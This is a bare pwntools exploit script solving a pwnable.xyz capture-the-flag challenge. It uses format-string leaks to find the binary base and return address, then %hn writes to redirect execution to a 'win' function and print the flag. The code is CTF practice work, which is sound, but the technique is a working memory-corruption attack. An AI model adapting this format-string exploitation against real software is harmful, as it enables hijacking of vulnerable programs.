from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30010)
elf = ELF('./challenge')

bss = 0x2000
fmt = 0x2060

def edit(msg):
    p.sendlineafter('> ', '1')
    p.sendafter(': ', msg)

def preg():
    p.sendlineafter('> ', '2')

p.sendafter(': ', 'a'*0x19+'%3$p')
preg()
base = int(p.recvuntil('1.')[:-2], 16) - 0x943
win = base + elf.sym['win']
success('base = 0x%x', base)
success('win = 0x%x', win)

edit('a'*0x19+'%10$p')
preg()
ret_addr = int(p.recvuntil('1.')[:-2], 16) - 0xc
success('ret address = 0x%x', ret_addr)

edit('a'*0x19+'a%6$n')
p.sendlineafter('> ', str(base+bss+2))  # only check the lowest byte so 0x??????02 is the same as 2

# use 6 to pad fmt with \x01 to leverage fmt
for i in range(5, 0x10):
    p.sendlineafter('> ', str(base+fmt+i))

# use fmt hijack return address's low two byte
p.sendlineafter('> ', str(base+bss+1))
p.sendafter(': ', f'%{(win&0xffff)-12}c%6$hn'.ljust(0x1f, 'a'))
p.sendlineafter('> ', str(ret_addr-(1<<32)))

# use fmt hijack return address's high two byte
p.sendlineafter('> ', str(base+bss+1))
p.sendafter(': ', f'%{(win>>16)-12}c%6$hn'.ljust(0x1f, 'a'))
p.sendlineafter('> ', str(ret_addr+2-(1<<32)))

p.sendlineafter('> ', '0')

print(p.recvuntil('}'))